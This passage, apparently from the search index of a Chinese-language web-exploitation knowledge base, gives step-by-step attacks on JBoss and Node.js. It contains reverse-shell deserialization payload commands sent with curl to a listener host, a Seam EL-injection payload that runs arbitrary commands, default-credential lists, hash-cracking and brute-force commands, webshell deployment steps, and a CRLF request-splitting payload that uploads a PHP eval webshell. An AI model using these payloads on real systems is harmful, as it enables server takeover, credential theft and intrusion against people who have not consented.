4.x</code>\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\uff0c<code>JbossMQ</code>\u5b9e\u73b0\u8fc7\u7a0b\u7684<code>JMS over HTTP Invocation Layer</code>\u7684<code>HTTPServerILServlet.java</code>\u2f42\u4ef6\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u501f\u52a9\u7279\u5236\u7684\u5e8f\u5217\u5316\u6570\u636e\u5229\u2f64\u8be5\u6f0f\u6d1e\u6267\u2f8f\u4efb\u610f\u4ee3\u7801\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_6","title":"\u5f71\u54cd\u7248\u672c","text":"<p><code>JBoss AS 4.x</code>\u53ca\u4e4b\u524d\u7248\u672c</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_7","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>1\u3001\u9996\u5148\u9a8c\u8bc1\u76ee\u6807<code>jboss</code>\u662f\u5426\u5b58\u5728\u6b64\u6f0f\u6d1e,\u76f4\u63a5\u8bbf\u95ee </p> <pre><code>poc url : http://10.211.55.7:8080/jbossmq-httpil/HTTPServerILServlet/\n</code></pre> <p>2\u3001\u5982\u679c\u8fd4\u56de\u4ee5\u4e0b\u5185\u5bb9,\u5219\u8bf4\u660e\u76ee\u6807\u7684<code>jboss</code>\u53ef\u80fd\u5b58\u5728\u6b64\u6f0f\u6d1e,\u800c\u540e\u7ee7\u7eed\u5c1d\u8bd5\u8fdb\u4e00\u6b65\u5229\u7528\u5373\u53ef 3\u3001\u6b64\u5904\u6211\u4eec\u4f7f\u7528<code>JavaDeserH2HC</code>\u5de5\u5177\u6765\u5229\u7528\u8be5\u6f0f\u6d1e,\u5c1d\u8bd5\u76f4\u63a5\u5f39\u56de\u4e00\u4e2a\u76ee\u6807\u7cfb\u7edf\u7684\u539f\u751f <code>cmd shell</code></p> <pre><code>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\njava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 10.211.55.16:53\ncurl http://10.211.55.7:8080/jbossmq-httpil/HTTPServerILServlet/ --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n</code></pre> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#jboss-jmxinvokerservlet-cve-2015-7501","title":"JBoss JMXInvokerServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e (CVE-2015-7501)","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_8","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>\u7531\u4e8e<code>JBoss</code>\u4e2d<code>invoker/JMXInvokerServlet</code>\u8def\u5f84\u5bf9\u5916\u5f00\u653e\uff0cJBoss\u7684<code>jmx</code>\u7ec4\u4ef6\u2f40\u6301Java\u53cd\u5e8f\u5217\u5316</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_9","title":"\u5f71\u54cd\u7248\u672c","text":"<p>\u5b9e\u9645\u4e0a\u4e3b\u8981\u96c6\u4e2d\u5728 jboss 6.x \u7248\u672c\u4e0a:</p> <pre><code> Apache Group Commons Collections 4.0 \n Apache Group Commons Collections 3.2.1 \n Apache Group Commons Collections\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_10","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u9a8c\u8bc1\u662f\u5426\u5b58\u5728\u6b64\u6f0f\u6d1e,\u76f4\u63a5\u8bbf\u95ee </p> <pre><code>poc url: http://target/invoker/JMXInvokerServlet \n</code></pre> <p>\u5982\u679c\u50cf\u4e0b\u9762\u4e00\u6837\u76f4\u63a5\u63d0\u793a\u4e0b\u8f7d,\u5219\u8bf4\u660e\u76ee\u6807\u53ef\u80fd\u5b58\u5728\u6b64\u6f0f\u6d1e </p> <p>\u4e0b\u9762\u4f7f\u7528JavaDeserH2HC \u751f\u6210\u53cd\u5f39 shell \u7684 payload</p> <pre><code># cd JavaDeserH2HC/\n# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\n# java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap \u516c\u7f51vps\u7684ip:\u7aef\u53e3\u53f7\n# curl http://target/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n</code></pre> <p>\u6253\u5f00nc\u754c\u2faf\uff0c\u53d1\u73b0shell\u5df2\u7ecf\u5f39\u56de\u6210\u529f\u4e86\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#jboss-ejbinvokerservlet-cve-2013-4810","title":"JBoss EJBInvokerServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2013-4810\uff09","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_11","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>\u6b64\u6f0f\u6d1e\u548c<code>CVE-2015-7501</code>\u6f0f\u6d1e\u539f\u7406\u76f8\u540c\uff0c\u4e24\u8005\u7684\u533a\u522b\u5c31\u5728\u4e8e\u4e24\u4e2a\u6f0f\u6d1e\u9009\u62e9\u7684\u8fdb\u884c\u5176\u4e2d<code>JMXInvokerServlet</code>\u548c<code>EJBInvokerServlet</code>\u5229\u7528\u7684\u662f<code>org.jboss.invocation.MarshalledValue</code>\u8fdb\u884c\u7684\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u800c<code>web-console/Invoker</code>\u5229\u7528\u7684\u662f<code>org.jboss.console.remote.RemoteMBeanInvocation</code>\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5e76\u4e0a\u4f20\u6784\u9020\u7684\u6587\u4ef6\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_12","title":"\u5f71\u54cd\u7248\u672c","text":"<p>\u5b9e\u9645\u4e0a\u4e3b\u8981\u96c6\u4e2d\u5728 <code>jboss 6.x</code> \u7248\u672c\u4e0a:</p> <pre><code> Apache Group Commons Collections 4.0 \n Apache Group Commons Collections 3.2.1 \n Apache Group Commons Collections\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_13","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u8ddfCVE-2015-7501\u5229\u2f64\u2f45\u6cd5\u2f00\u6837\uff0c\u53ea\u662f\u8def\u5f84\u4e0d\u2f00\u6837\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u5229\u2f64\u8def\u5f84 \u662f <code>/invoker/EJBInvokerServlet</code></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#jboss-seam2","title":"JBoss seam2\u6a21\u677f\u6ce8\u5165","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#cve-2010-1871","title":"CVE-2010-1871","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_14","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p><code>JBossSeam</code>\u662f\u4e00\u4e2a<code>JavaEE5</code>\u6846\u67b6\uff0c\u628aJSF\u4e0e<code>EJB3.0</code>\u7ec4\u4ef6\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u4ece\u800c\u4e3a\u5f00\u53d1\u57fa\u4e8eWeb\u7684\u4f01\u4e1a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e00\u4e2a\u6700\u65b0\u7684\u6a21\u5f0f\u3002<code>JBossSeam</code>\u5904\u7406\u67d0\u4e9b\u53c2\u6570\u5316<code>JBossEL</code>\u8868\u8fbe\u5f0f\u7684\u65b9\u5f0f\u5b58\u5728\u8f93\u5165\u8fc7\u6ee4\u6f0f\u6d1e\u3002\u5982\u679c\u8fdc\u7a0b\u653b\u51fb\u8005\u80fd\u591f\u8bf1\u9a97\u901a\u8fc7\u8ba4\u8bc1\u7684<code>JBossSeam</code>\u7528\u6237\u8bbf\u95ee\u7279\u5236\u7684\u7f51\u9875\uff0c\u5c31\u53ef\u80fd\u5bfc\u81f4\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_15","title":"\u5f71\u54cd\u7248\u672c","text":"<p>Redhat Jboss_enterprise_application_platform:4.3.0 </p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_16","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>1\u3001\u6b64\u6f0f\u6d1e\u662f\u901a\u8fc7<code>seam</code>\u7ec4\u4ef6\u4e2d\u63d2\u5165<code>#{payload}</code>\u8fdb\u884c\u6a21\u677f\u6ce8\u5165\uff0c\u53ef\u4ee5\u5728\u4ee5\u4e0b\u94fe\u63a5\u4e2d\u63d2\u5165\u8981\u6267\u884c\u7684\u65b9\u6cd5\uff0c\u901a\u8fc7Java\u53cd\u5c04\u673a\u5236\u6765\u83b7\u53d6\u5230\uff08<code>Java.lang.Runtime.getRuntime().exec()</code>\u65b9\u6cd5\uff09,\u4ece\u800c\u53ef\u4ee5\u4f20\u5165\u4efb\u4f55\u60f3\u8981\u6267\u884c\u7684\u547d\u4ee4\u3002</p> <pre><code>/admin-console/login.seam?actionOutcome=/success.xhtml?user%3d%23{}\u7684#{}\n</code></pre> <p>2\u3001POC\u5982\u4e0b\uff0c\u5176\u4e2dcmd\u4ee3\u8868\u4f20\u5165\u7684\u8fdc\u7a0b\u547d\u4ee4\u3002\u5728<code>/admin-console/login.seam</code>\u8def\u5f84\u4e0b\uff0cPOST\u4f20\u5165\u6784\u9020\u597d\u7684<code>payload</code>\uff0c\u5373\u53ef\u5bf9\u6b64\u6f0f\u6d1e\u5229\u7528\u3002</p> <pre><code>actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('Java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('Java.lang.Runtime')).exec(cmd)}\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_17","title":"\u5176\u5b83\u6f0f\u6d1e\u4e0e\u5229\u7528","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#jboss-7xwildflyhash","title":"Jboss 7.x\u4e0eWildFly\u63a7\u5236\u53f0\u7528\u6237\u5bc6\u7801hash\u7834\u89e3","text":"<p>\u641c\u96c6<code>jboss</code>\u4e2d\u7684\u6240\u6709\u5bc6\u7801,\u53ef\u4ee5\u4e3a\u540e\u7eed\u5185\u7f51\u6a2a\u5411\u79fb\u52a8\u63d0\u524d\u505a\u597d\u51c6\u5907 \u57287.x\u4ee5\u4e0b\u7684\u7248\u672c\uff0cjboss\u7528\u6237\u5bc6\u7801\u901a\u5e38\u9ed8\u8ba4\u90fd\u662f\u76f4\u63a5\u660e\u6587\u4fdd\u5b58\u5728\u4e0b\u9762\u7684\u6587\u4ef6\u4e2d\u7684</p> <pre><code>C:\\Users\\tale\\Desktop\\jboss-4.2.3.GA\\server\\default\\conf\\propsjmx-console-users.properties\n</code></pre> <p></p> <p>\u800c\u9ad8\u7248\u672c\u7684<code>jboss</code>\u548c<code>wildfly</code>\u901a\u5e38\u90fd\u662f\u52a0\u5bc6\u4fdd\u5b58\u5728\u4e0b\u9762\u7684\u6587\u4ef6\u4e2d,\u9ed8\u8ba4\u5bc6\u7801\u52a0\u5bc6\u683c\u5f0f\u4e3a  <code>HEX( MD5( username ':' realm ':' password))</code></p> <pre><code>C:\\services\\wildfly-10.1.0.Final\\standalone\\configuration\\mgmt-users.properties\n</code></pre> <p><code>john</code>\u4e5f\u5bf9\u6b64\u7b97\u6cd5\u652f\u6301,\u7f16\u53f7\u4e3a<code>1591</code>\uff0c\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u7834\u89e3</p> <pre><code># john --wordlist=password.list --format=dynamic_1591\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#jboss-7x","title":"Jboss &lt; 7.x\u9ed8\u8ba4\u7ba1\u7406\u63a7\u5236\u53f0\u5f31\u53e3\u4ee4\u7206\u7834","text":"<p><code>jboss 6.x-7.x</code>\u7248\u672c\u7684\u9ed8\u8ba4\u7ba1\u7406\u63a7\u5236\u53f0\u5165\u53e3,\u56e0\u6b64\u7248\u672c\u9ed8\u8ba4\u6ca1\u6709\u5f3a\u5236\u590d\u6742\u5bc6\u7801\u7b56\u7565,\u6240\u4ee5\u6bd4\u8f83\u5bb9\u6613\u51fa\u73b0\u5f31\u53e3\u4ee4\u3002 Jboss \u7684\u5e38\u89c1\u5f31\u53e3\u4ee4:</p> <pre><code>admin:admin\nadmin:jboss\nadmin:password1! \njboss:admin \nadmin:ezoffice\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#jboss-7x-wildfly","title":"Jboss &gt; 7.x \u548cWildFly\u9ed8\u8ba4\u7ba1\u7406\u63a7\u5236\u53f0\u5f31\u53e3\u4ee4\u7206\u7834","text":"<p><code>jboss</code>\u4ece8\u5f00\u59cb\u6b63\u5f0f\u66f4\u540d\u4e3a<code>WildFly</code> ,\u5728<code>WildFly8</code>\u4e4b\u540e\u7684\u7248\u672c\u6dfb\u52a0\u63a7\u5236\u53f0\u7528\u6237\u65f6\u9ed8\u8ba4\u5c31\u4f1a\u6267\u884c\u5f3a\u5bc6\u7801\u7b56\u7565,\u6240\u4ee5\u76f8\u5bf9\u4e8e\u4e4b\u524d\u4f4e\u7248\u672c\u7684<code>jboss</code>,\u9488\u5bf9<code>WildFly</code>\u4e4b\u540e\u7248\u672c\u7684\u5f31\u53e3\u4ee4\u63a8\u8350<code>wildPwn</code>\u8fd9\u6b3e\u7206\u7834\u5de5\u5177</p> <pre><code># git clone https://github.com/hlldz/wildPwn.git \n# cd wildPwn\n# python wildPwn.py -m brute --target 192.168.3.108 --port 8080 -user userList.txt -pass passList.txt  \n</code></pre> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#wildflywebshell","title":"WildFly\u9ed8\u8ba4\u7ba1\u7406\u63a7\u5236\u53f0\u90e8\u7f72webshell\u65b9\u6cd5","text":"<p>1\u3001\u901a\u8fc7\u8d26\u53f7\u5bc6\u7801\u767b\u5230 <code>wildlfy</code> \u63a7\u5236\u53f0\u9875\u9762\u540e,\u627e\u5230 <code>Deployments</code> \u9009\u9879,\u4e0a\u4f20<code>war</code>\u5305 2\u3001\u6b64\u5904\u52fe\u9009\u542f\u7528<code>Enable</code> 3\u3001\u63d0\u793a\u6210\u529f\u540e\u4f1a\u76f4\u63a5\u90e8\u7f72\u5230<code>jboss</code>\u6839\u76ee\u5f55\u4e0b,\u8bbf\u95ee<code>http://127.0.0.1:8080/cmd/cmd.jsp</code> 4\u3001\u8bbf\u95ee\u6728\u9a6cwebshell </p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs_unicode%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F/","title":"NodeJS HTTP \u62c6\u5206\u653b\u51fb","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs_unicode%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F/#http-unicode","title":"HTTP \u8bf7\u6c42\u8def\u5f84\u4e2d\u7684 Unicode \u5b57\u7b26\u635f\u574f","text":"<p>\u867d\u7136\u7528\u6237\u53d1\u51fa\u7684 HTTP \u8bf7\u6c42\u901a\u5e38\u5c06\u8bf7\u6c42\u8def\u5f84\u6307\u5b9a\u4e3a\u5b57\u7b26\u4e32\uff0c\u4f46Node.js\u6700\u7ec8\u5fc5\u987b\u5c06\u8bf7\u6c42\u4f5c\u4e3a\u539f\u59cb\u5b57\u8282\u8f93\u51fa\u3002JavaScript\u652f\u6301unicode\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u5c06\u5b83\u4eec\u8f6c\u6362\u4e3a\u5b57\u8282\u610f\u5473\u7740\u9009\u62e9\u5e76\u5e94\u7528\u9002\u5f53\u7684Unicode\u7f16\u7801\u3002\u5bf9\u4e8e\u4e0d\u5305\u542b\u4e3b\u4f53\u7684\u8bf7\u6c42\uff0cNode.js\u9ed8\u8ba4\u4f7f\u7528\u201clatin1\u201d\uff0c\u8fd9\u662f\u4e00\u79cd\u5355\u5b57\u8282\u7f16\u7801\u5b57\u7b26\u96c6\uff0c\u4e0d\u80fd\u8868\u793a\u9ad8\u7f16\u53f7\u7684Unicode\u5b57\u7b26\uff0c\u4f8b\u5982\ud83d\udc36\u8fd9\u4e2a\u8868\u60c5\u3002\u6240\u4ee5\uff0c\u5f53\u6211\u4eec\u7684\u8bf7\u6c42\u8def\u5f84\u4e2d\u542b\u6709\u591a\u5b57\u8282\u7f16\u7801\u7684Unicode\u5b57\u7b26\u65f6\uff0c\u4f1a\u88ab\u622a\u65ad\u53d6\u6700\u4f4e\u5b57\u8282\uff0c\u6bd4\u5982 <code>\\u0130</code> \u5c31\u4f1a\u88ab\u622a\u65ad\u4e3a <code>\\u30</code></p> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs_unicode%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F/#unicode-http","title":"Unicode \u5b57\u7b26\u635f\u574f\u9020\u6210\u7684 HTTP \u62c6\u5206\u653b\u51fb","text":"<p>\u7531\u4e8e Nodejs \u7684 HTTP \u5e93\u5305\u542b\u4e86\u963b\u6b62 CRLF \u7684\u63aa\u65bd\uff0c\u5373\u5982\u679c\u4f60\u5c1d\u8bd5\u53d1\u51fa\u4e00\u4e2a URL \u8def\u5f84\u4e2d\u542b\u6709\u56de\u8f66\u3001\u6362\u884c\u6216\u7a7a\u683c\u7b49\u63a7\u5236\u5b57\u7b26\u7684 HTTP \u8bf7\u6c42\u662f\uff0c\u5b83\u4eec\u4f1a\u88ab URL \u7f16\u7801\uff0c\u6240\u4ee5\u6b63\u5e38\u7684 CRLF \u6ce8\u5165\u5728 Nodejs \u4e2d\u5e76\u4e0d\u80fd\u5229\u7528</p> <p>\u901a\u8fc7\u5728\u8bf7\u6c42\u8def\u5f84\u4e2d\u5305\u542b\u7cbe\u5fc3\u9009\u62e9\u7684Unicode\u5b57\u7b26\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6b3a\u9a97Node.js\u5e76\u6210\u529f\u5b9e\u73b0CRLF\u6ce8\u5165\u3002</p> <pre><code>http.get('http://47.101.57.72:4000/\\u0120HTTP/1.1\\u010D\\u010ASet-Cookie:\\u0120PHPSESSID=whoami\\u010D\\u010Atest:').output [ 'GET /\u0120HTTP/1.1\u010d\u010aSet-Cookie:\u0120PHPSESSID=whoami\u010d\u010atest: HTTP/1.1\\r\\nHost: 47.101.57.72:4000\\r\\nConnection: close\\r\\n\\r\\n' ]\n</code></pre> <p></p> <p>\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u4f7f\u7528\u4e86\u4e00\u4e2atest\uff1a\u6765\u95ed\u5408\u6389\u591a\u4f59\u7684HTTP/1.1</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs_unicode%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F/#http-http","title":"\u5728 HTTP \u72b6\u6001\u884c\u6ce8\u5165\u5b8c\u6574 HTTP \u8bf7\u6c42","text":"<p>\u9996\u5148\uff0c\u7531\u4e8e NodeJS \u7684\u8fd9\u4e2a CRLF \u6ce8\u5165\u70b9\u5728 HTTP \u72b6\u6001\u884c\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u8981\u6ce8\u5165\u5b8c\u6574\u7684 HTTP \u8bf7\u6c42\u7684\u8bdd\u9700\u8981\u5148\u95ed\u5408\u72b6\u6001\u884c\u4e2d <code>HTTP/1.1</code> \uff0c\u5373\u4fdd\u8bc1\u6ce8\u5165\u540e\u6709\u6b63\u5e38\u7684 HTTP \u72b6\u6001\u884c\u3002\u5176\u6b21\u4e3a\u4e86\u4e0d\u8ba9\u539f\u6765\u7684 <code>HTTP/1.1</code> \u5f71\u54cd\u6211\u4eec\u65b0\u6784\u9020\u7684\u8bf7\u6c42\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u518d\u6784\u9020\u4e00\u6b21 <code>GET /</code> \u95ed\u5408\u539f\u6765\u7684 HTTP \u8bf7\u6c42\u3002</p> <p>\u5047\u8bbe\u76ee\u6807\u4e3b\u673a\u5b58\u5728SSRF\uff0c\u9700\u8981\u6211\u4eec\u5728\u76ee\u6807\u4e3b\u673a\u672c\u5730\u4e0a\u4f20\u6587\u4ef6\u3002\u6211\u4eec\u9700\u8981\u5c1d\u8bd5\u6784\u9020\u5982\u4e0b\u8fd9\u4e2a\u6587\u4ef6\u4e0a\u4f20\u7684\u5b8c\u6574 POST \u8bf7\u6c42</p> <pre><code>payload = ''' HTTP/1.1\n\nPOST /upload.php HTTP/1.1\nHost: 127.0.0.1\nContent-Length: 437\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: PHPSESSID=nk67astv61hqanskkddslkgst4\nConnection: close\n\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n100000\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"shell.php\"\nContent-Type: application/octet-stream\n\n&lt;?php eval($_POST[\"whoami\"]);?&gt;\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"Upload\"\n\nUpload\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\n\nGET / HTTP/1.1\ntest:'''.replace(\"\\n\",\"\\r\\n\")\n\npayload = payload.replace('\\r\\n', '\\u010d\\u010a') \\\n    .replace('+', '\\u012b') \\\n    .replace(' ', '\\u0120') \\\n    .replace('\"', '\\u0122') \\\n    .replace(\"'\", '\\u0a27') \\\n    .replace('[', '\\u015b') \\\n    .replace(']', '\\u015d') \\\n    .replace('`', '\\u0127') \\\n    .replace('\"', '\\u0122') \\\n    .replace(\"'\", '\\u0a27') \\\n    .replace('[', '\\u015b') \\\n    .replace(']', '\\u015d') \\\n\nprint(payload)\n\n# \u8f93\u51fa: \u0120HTTP/1.1\u010d\u010a\u010d\u010aPOST\u0120/upload.php\u0120HTTP/1.1\u010d\u010aHost:\u0120127.0.0.1\u010d\u010aContent-Length:\u0120437\u010d\u010aContent-Type:\u0120multipart/form-data;\u0120boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\u010d\u010aUser-Agent:\u0120Mozilla/5.0\u0120(Windows\u0120NT\u012010.0;\u0120Win64;\u0120x64)\u0120AppleWebKit/537.36\u0120(KHTML,\u0120like\u0120Gecko)\u0120Chrome/90.0.4430.72\u0120Safari/537.36\u010d\u010aAccept:\u0120text/html,application/xhtml\u012bxml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u010d\u010aAccept-Encoding:\u0120gzip,\u0120deflate\u010d\u010aAccept-Language:\u0120zh-CN,zh;q=0.9\u010d\u010aCookie:\u0120PHPSESSID=nk67astv61hqanskkddslkgst4\u010d\u010aConnection:\u0120close\u010d\u010a\u010d\u010a------WebKitFormBoundaryjDb9HMGTixAA7Am6\u010d\u010aContent-Disposition:\u0120form-data;\u0120name=\u0122MAX_FILE_SIZE\u0122\u010d\u010a\u010d\u010a100000\u010d\u010a------WebKitFormBoundaryjDb9HMGTixAA7Am6\u010d\u010aContent-Disposition:\u0120form-data;\u0120name=\u0122uploaded\u0122;\u0120filename=\u0122shell.php\u0122\u010d\u010aContent-Type:\u0120application/octet-stream\u010d\u010a\u010d\u010a&lt;?php\u0120eval($_POST\u015b\u0122whoami\u0122\u015d);?&gt;\u010d\u010a------WebKitFormBoundaryjDb9HMGTixAA7Am6\u010d\u010aContent-Disposition:\u0120form-data;\u0120name=\u0122Upload\u0122\u010d\u010a\u010d\u010aUpload\u010d\u010a------WebKitFormBoundaryjDb9HMGTixAA7Am6--\u010d\u010a\u010d\u010aGET\u0120/\u0120HTTP/1.1\u010d\u010atest:\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs_unicode%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F/#_1","title":"\u6d41\u7a0b\u5206\u6790","text":"<p>\u539f\u59cb\u8bf7\u6c42\u6570\u636e\u5982\u4e0b\uff1a</p> <pre><code>GET / HTTP/1.1\nHost: 47.101.57.72:4000\n</code></pre> <p>\u5f53\u6211\u4eec\u63d2\u5165CRLF\u6570\u636e\u540e\uff0cHTTP\u8bf7\u6c42\u6570\u636e\u53d8\u6210\u4e86\uff1a</p> <pre><code>GET / HTTP/1.1\n\nPOST /upload.php HTTP/1.1\nHost: 127.0.0.1\nContent-Length: 437\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\n......\n&lt;?php eval($_POST[\"whoami\"]);?&gt;\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"Upload\"\n\nUpload\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\n\n HTTP/1.1\nHost: 47.101.57.72:4000\n</code></pre> <p>\u4e0a\u6b21\u8bf7\u6c42\u5305\u7684Host\u5b57\u6bb5\u548c\u72b6\u6001\u884c\u4e2d\u7684 <code>HTTP/1.1</code> \u5c31\u5355\u72ec\u51fa\u6765\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u518d\u6784\u9020\u4e00\u4e2a\u8bf7\u6c42\u628a\u4ed6\u95ed\u5408\uff1a</p> <pre><code>GET / HTTP/1.1\n\nPOST /upload.php HTTP/1.1\nHost: 127.0.0.1\nContent-Length: 437\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\n......\n&lt;?php eval($_POST[\"whoami\"]);?&gt;\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"Upload\"\n\nUpload\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\n\nGET / HTTP/1.1\ntest: HTTP/1.1\nHost: 47.101.57.72:4000\n</code></pre> 